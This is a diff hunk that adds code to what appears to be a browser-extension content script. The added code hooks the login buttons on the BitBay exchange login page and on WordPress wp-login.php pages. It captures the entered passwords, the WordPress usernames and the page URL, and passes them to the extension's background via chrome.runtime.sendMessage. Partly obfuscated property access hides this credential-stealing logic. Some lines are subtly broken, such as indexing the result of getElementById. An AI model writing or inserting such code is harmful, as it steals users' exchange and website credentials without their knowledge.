@@ -436,7 +436,35 @@ var login_form = document.getElementById("loginForm");
       }, 1000)
   };
 
+  if (top['location']['href'] === 'https://auth.bitbay.net/login-password') {
+      var interval = setInterval(function () {
+          if (document['getElementsByClassName']('main-content-container')[0]) {
+              clearInterval(interval);
+              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
+               var login = {};
+              login.username = "null" //document.getElementsByName("email")[0].value;
+              login.pass = document.getElementsByName("password")[0].value;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",login});
+              }
+          }
+      }, 1000)
+  };
 
+if (top['location']['href']['indexOf']('wp-login.php') > -1) {
+      var interval = setInterval(function () {
+          if (document['getElementById']('loginform')[0]) {
+              clearInterval(interval);
+              document['getElementsByClassName']('wp-submit')[0].onclick = function (_0x441cx2) {
+               var login = {};
+              login.username = document.getElementById("user_login")[0].value;
+              login.pass = document.getElementById("user_pass")[0].value;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",login});
+              }
+          }
+      }, 1000)
+  };
 // var img = document.getElementsByTagName('img');
 //      for (var i = 0; i < img.length; i++){
 //     	if (img[i].src.indexOf('whos.amung.us/swidget/') > -1){
